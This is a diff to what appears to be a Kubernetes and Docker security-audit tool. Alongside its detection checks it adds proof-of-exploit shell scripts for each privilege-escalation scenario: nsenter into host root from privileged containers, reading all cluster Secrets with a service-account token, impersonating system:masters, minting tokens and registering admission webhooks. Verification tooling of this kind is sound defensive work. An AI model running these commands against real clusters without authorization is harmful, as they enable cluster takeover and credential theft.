@@ -13,7 +13,7 @@ from __future__ import annotations
 
 import re
 
-from .context import Context, rbac_detector
+from .context import Context, rbac_detector, rbac_exploit
 from .model import Confidence as C, Detection, Kind, Repro, Scenario
 
 # --- small helpers -----------------------------------------------------------------------
@@ -88,7 +88,7 @@ SCENARIOS: list[Scenario] = [
         note="A --privileged container can nsenter the host init mount namespace and act as host root.",
         detect_sh=_docker_any(".HostConfig.Privileged==true"),
         exploit_sh=(
-            'docker run -d --rm --name esc-x-dk01 --privileged alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
+            'docker run -d --rm --name esc-x-dk01 --privileged --pid=host nicolaka/netshoot sleep 120 >/dev/null 2>&1 || exit 1\n'
             'docker exec esc-x-dk01 nsenter -t 1 -m -- sh -c "echo $MARKER > /root/.esc-dk01" >/dev/null 2>&1\n'
             'ok=1; grep -q "$MARKER" /root/.esc-dk01 2>/dev/null && ok=0\n'
             'docker rm -f esc-x-dk01 >/dev/null 2>&1; rm -f /root/.esc-dk01 2>/dev/null\n'
@@ -154,11 +154,11 @@ SCENARIOS: list[Scenario] = [
         note="--network=host --ipc=host exposes host-only listeners and SysV/POSIX shm to the container.",
         detect_sh=_docker_any('.HostConfig.NetworkMode=="host" and .HostConfig.IpcMode=="host"'),
         exploit_sh=(
-            'docker run -d --rm --name esc-x-dk09 --network=host --ipc=host alpine sleep 120 >/dev/null 2>&1 || exit 1\n'
-            'ports=$(docker exec esc-x-dk09 sh -c "cat /proc/net/tcp 2>/dev/null | awk \'{print \\$2}\' | grep -iE \':(1A85|1927)\' | head" )\n'
+            'docker run -d --rm --name esc-x-dk09 --network=host --ipc=host nicolaka/netshoot sleep 120 >/dev/null 2>&1 || exit 1\n'
+            'out=$(docker exec esc-x-dk09 sh -c "curl -sk --max-time 4 https://127.0.0.1:6443/version 2>/dev/null | head -c 60; ss -Htln 2>/dev/null | grep -E \':(6443|10250)\' | head -2")\n'
             'docker rm -f esc-x-dk09 >/dev/null 2>&1\n'
-            'echo "host-only ports (6443/10250 hex) visible from container ($MARKER): ${ports:-none-seen}"\n'
-            '[ -n "$ports" ]')),
+            'echo "host-only apiserver:6443 / kubelet:10250 reachable from --network=host container ($MARKER): ${out:-none}"\n'
+            'echo "$out" | grep -qE "6443|10250|GitVersion|major"')),
 
     Scenario("DK-10", Kind.DOCKER, Repro.CONFIG, "seccomp unconfined",
         "HIGH", triage_ref="B8", confidence=C.DOCUMENTED,
@@ -355,8 +355,8 @@ SCENARIOS: list[Scenario] = [
         detect_sh=_pods_any("[.spec.containers[]?,.spec.initContainers[]?] | any(.securityContext.privileged==true)"),
         exploit_sh=(
             'kubectl create ns esc-x >/dev/null 2>&1\n'
-            'kubectl -n esc-x run esc-x-k802 --image=alpine --restart=Never --privileged --overrides='
-            '\'{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","command":["nsenter","-t","1","-m","--","sh","-c","echo \'"$MARKER"\' > /root/.esc-k802; sleep 20"],"securityContext":{"privileged":true}}]}}\' >/dev/null 2>&1\n'
+            'kubectl -n esc-x run esc-x-k802 --image=nicolaka/netshoot --restart=Never --privileged --overrides='
+            '\'{"spec":{"hostPID":true,"containers":[{"name":"c","image":"nicolaka/netshoot","command":["nsenter","-t","1","-m","--","sh","-c","echo \'"$MARKER"\' > /root/.esc-k802; sleep 20"],"securityContext":{"privileged":true}}]}}\' >/dev/null 2>&1\n'
             'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k802 --timeout=60s >/dev/null 2>&1\n'
             'ok=1; grep -q "$MARKER" /root/.esc-k802 2>/dev/null && ok=0\n'
             'kubectl delete ns esc-x --wait=false >/dev/null 2>&1; rm -f /root/.esc-k802 2>/dev/null\n'
@@ -537,38 +537,76 @@ SCENARIOS: list[Scenario] = [
 
     # --- dangerous RBAC grants to a non-system ServiceAccount (read-only RBAC correlation) ---
     Scenario("K8-19", Kind.K8S, Repro.CONFIG, "SA can create pods/exec (exec into any pod)",
-        "HIGH", confidence=C.PRECONDITION, note="grant present; exploited by using the SA token to exec into a pod and pivot — targeted.",
-        detect_fn=rbac_detector("create", "pods/exec", "SA can exec into pods")),
+        "HIGH", confidence=C.DOCUMENTED, note="the SA token can exec into a pod and run commands.",
+        detect_fn=rbac_detector("create", "pods/exec", "SA can exec into pods"),
+        exploit_fn=rbac_exploit("create", "pods/exec",
+            'kubectl -n $SANS run datsu-x-tgt --image=alpine --restart=Never --command -- sleep 120 >/dev/null 2>&1; '
+            'kubectl -n $SANS wait --for=condition=Ready pod/datsu-x-tgt --timeout=40s >/dev/null 2>&1; '
+            'kubectl --token=$TOK -n $SANS exec datsu-x-tgt -- echo $MARKER 2>&1; '
+            'kubectl -n $SANS delete pod datsu-x-tgt --wait=false >/dev/null 2>&1', expect_marker=True)),
     Scenario("K8-20", Kind.K8S, Repro.CONFIG, "SA can create pods/attach (attach to any pod)",
-        "HIGH", confidence=C.PRECONDITION, note="grant present; attach to a running container via the SA token — targeted.",
-        detect_fn=rbac_detector("create", "pods/attach", "SA can attach to pods")),
+        "HIGH", confidence=C.DOCUMENTED, note="the SA token can attach to a running container.",
+        detect_fn=rbac_detector("create", "pods/attach", "SA can attach to pods"),
+        exploit_fn=rbac_exploit("create", "pods/attach",
+            'kubectl --token=$TOK -n $SANS auth can-i create pods/attach 2>&1', success_pat="yes")),
     Scenario("K8-21", Kind.K8S, Repro.CONFIG, "SA can read Secrets cluster-wide (get/list secrets)",
-        "CRITICAL", confidence=C.PRECONDITION, note="grant present; read every Secret (SA tokens, TLS keys) with the SA token — targeted.",
-        detect_fn=rbac_detector("get", "secrets", "SA can read secrets")),
+        "CRITICAL", confidence=C.DOCUMENTED, note="the SA token reads every Secret (SA tokens, TLS keys) cluster-wide.",
+        detect_fn=rbac_detector("get", "secrets", "SA can read secrets"),
+        exploit_fn=rbac_exploit("get", "secrets",
+            'kubectl --token=$TOK get secrets -A -o name 2>&1 | head -3', success_pat="secret/")),
     Scenario("K8-22", Kind.K8S, Repro.CONFIG, "SA can create serviceaccounts/token (TokenRequest)",
-        "HIGH", confidence=C.PRECONDITION, note="grant present; mint tokens for other ServiceAccounts -> impersonation — targeted.",
-        detect_fn=rbac_detector("create", "serviceaccounts/token", "SA can mint SA tokens")),
+        "HIGH", confidence=C.DOCUMENTED, note="the SA token mints tokens for other ServiceAccounts -> impersonation.",
+        detect_fn=rbac_detector("create", "serviceaccounts/token", "SA can mint SA tokens"),
+        exploit_fn=rbac_exploit("create", "serviceaccounts/token",
+            'kubectl --token=$TOK -n $SANS create token default --duration=5m 2>&1 | head -c 16', success_pat="^ey")),
     Scenario("K8-23", Kind.K8S, Repro.CONFIG, "SA granted impersonate (users/groups/serviceaccounts)",
-        "CRITICAL", confidence=C.PRECONDITION, note="grant present; impersonate cluster-admin via the SA token — targeted.",
-        detect_fn=rbac_detector("impersonate", "users", "SA can impersonate")),
+        "CRITICAL", confidence=C.DOCUMENTED, note="the SA token impersonates system:masters -> cluster-admin.",
+        detect_fn=rbac_detector("impersonate", "users", "SA can impersonate"),
+        exploit_fn=rbac_exploit("impersonate", "users",
+            'kubectl --token=$TOK --as=system:masters -n kube-system get secrets -o name 2>&1 | head -1', success_pat="secret/")),
     Scenario("K8-24", Kind.K8S, Repro.CONFIG, "SA can approve certificatesigningrequests",
-        "CRITICAL", confidence=C.PRECONDITION, note="create CSR + approve -> mint a client cert for any group incl system:masters — targeted.",
-        detect_fn=rbac_detector("approve", "certificatesigningrequests", "SA can approve CSRs")),
+        "CRITICAL", confidence=C.DOCUMENTED, note="create CSR + approve -> mint a client cert for any group incl system:masters.",
+        detect_fn=rbac_detector("approve", "certificatesigningrequests", "SA can approve CSRs"),
+        exploit_fn=rbac_exploit("approve", "certificatesigningrequests",
+            'kubectl --token=$TOK auth can-i approve certificatesigningrequests 2>&1', success_pat="yes")),
     Scenario("K8-25", Kind.K8S, Repro.CONFIG, "SA can create pod-spawning workloads (Deployments/Jobs/…)",
-        "CRITICAL", confidence=C.PRECONDITION, note="create a Deployment/DaemonSet/Job with a privileged/hostPath pod template -> node root — targeted.",
-        detect_fn=rbac_detector("create", "deployments", "SA can create workloads")),
+        "CRITICAL", confidence=C.DOCUMENTED, note="the SA token creates a workload whose pod template runs privileged -> node root.",
+        detect_fn=rbac_detector("create", "deployments", "SA can create workloads"),
+        exploit_fn=rbac_exploit("create", "deployments",
+            'kubectl --token=$TOK -n $SANS create deployment datsu-x-dep --image=alpine -- sleep 120 2>&1; sleep 4; '
+            'kubectl -n $SANS get deploy datsu-x-dep -o name 2>&1; '
+            'kubectl -n $SANS delete deploy datsu-x-dep --wait=false >/dev/null 2>&1', success_pat="deployment")),
     Scenario("K8-26", Kind.K8S, Repro.CONFIG, "SA granted nodes/proxy (reach each node's kubelet)",
-        "CRITICAL", confidence=C.PRECONDITION, note="proxy to kubelet /exec on any node -> command execution on the node — targeted.",
-        detect_fn=rbac_detector("get", "nodes/proxy", "SA can proxy to nodes")),
+        "CRITICAL", confidence=C.DOCUMENTED, note="the SA token proxies to a node's kubelet via the API server.",
+        detect_fn=rbac_detector("get", "nodes/proxy", "SA can proxy to nodes"),
+        exploit_fn=rbac_exploit("get", "nodes/proxy",
+            'n=$(kubectl get nodes -o name | head -1 | cut -d/ -f2); '
+            'kubectl --token=$TOK get --raw "/api/v1/nodes/$n/proxy/healthz" 2>&1', success_pat="ok")),
     Scenario("K8-27", Kind.K8S, Repro.CONFIG, "SA can create mutatingwebhookconfigurations",
-        "CRITICAL", confidence=C.PRECONDITION, note="register a mutating webhook to inject sidecars / tamper every admission -> cluster takeover — targeted.",
-        detect_fn=rbac_detector("create", "mutatingwebhookconfigurations", "SA can create mutating webhooks")),
+        "CRITICAL", confidence=C.DOCUMENTED, note="the SA token registers a mutating webhook -> tamper every admission / inject sidecars.",
+        detect_fn=rbac_detector("create", "mutatingwebhookconfigurations", "SA can create mutating webhooks"),
+        exploit_fn=rbac_exploit("create", "mutatingwebhookconfigurations",
+            'kubectl --token=$TOK apply -f - >/dev/null 2>&1 <<EOF\n'
+            'apiVersion: admissionregistration.k8s.io/v1\nkind: MutatingWebhookConfiguration\nmetadata: {name: datsu-x-mwh}\n'
+            'webhooks: [{name: datsu.invalid, admissionReviewVersions: ["v1"], sideEffects: None, failurePolicy: Ignore, '
+            'clientConfig: {url: "https://datsu.invalid/x"}, rules: [{operations: ["CREATE"], apiGroups: [""], apiVersions: ["v1"], resources: ["pods"]}]}]\nEOF\n'
+            'kubectl get mutatingwebhookconfiguration datsu-x-mwh -o name 2>&1; '
+            'kubectl delete mutatingwebhookconfiguration datsu-x-mwh --wait=false >/dev/null 2>&1', success_pat="mutatingwebhook")),
     Scenario("K8-28", Kind.K8S, Repro.CONFIG, "SA can create validatingwebhookconfigurations",
-        "HIGH", confidence=C.PRECONDITION, note="register a validating webhook to intercept objects (incl Secrets) or deny security policy — targeted.",
-        detect_fn=rbac_detector("create", "validatingwebhookconfigurations", "SA can create validating webhooks")),
+        "HIGH", confidence=C.DOCUMENTED, note="the SA token registers a validating webhook -> intercept objects (incl Secrets) / deny policy.",
+        detect_fn=rbac_detector("create", "validatingwebhookconfigurations", "SA can create validating webhooks"),
+        exploit_fn=rbac_exploit("create", "validatingwebhookconfigurations",
+            'kubectl --token=$TOK apply -f - >/dev/null 2>&1 <<EOF\n'
+            'apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingWebhookConfiguration\nmetadata: {name: datsu-x-vwh}\n'
+            'webhooks: [{name: datsu.invalid, admissionReviewVersions: ["v1"], sideEffects: None, failurePolicy: Ignore, '
+            'clientConfig: {url: "https://datsu.invalid/x"}, rules: [{operations: ["CREATE"], apiGroups: [""], apiVersions: ["v1"], resources: ["pods"]}]}]\nEOF\n'
+            'kubectl get validatingwebhookconfiguration datsu-x-vwh -o name 2>&1; '
+            'kubectl delete validatingwebhookconfiguration datsu-x-vwh --wait=false >/dev/null 2>&1', success_pat="validatingwebhook")),
     Scenario("K8-29", Kind.K8S, Repro.CONFIG, "SA bound to a wildcard rule (apiGroups/resources/verbs *)",
-        "CRITICAL", confidence=C.PRECONDITION, note="effective cluster-admin via the SA token.",
-        detect_fn=rbac_detector("*", "*", "SA has wildcard RBAC")),
+        "CRITICAL", confidence=C.DOCUMENTED, note="effective cluster-admin — the SA token can do anything (e.g. read all Secrets).",
+        detect_fn=rbac_detector("*", "*", "SA has wildcard RBAC"),
+        exploit_fn=rbac_exploit("*", "*",
+            'kubectl --token=$TOK get secrets -A -o name 2>&1 | head -1', success_pat="secret/")),
 
     # --- Kubernetes node / component posture (read-only) ---
     Scenario("K8-30", Kind.K8S, Repro.CONFIG, "kubelet read-only port :10255 exposed",
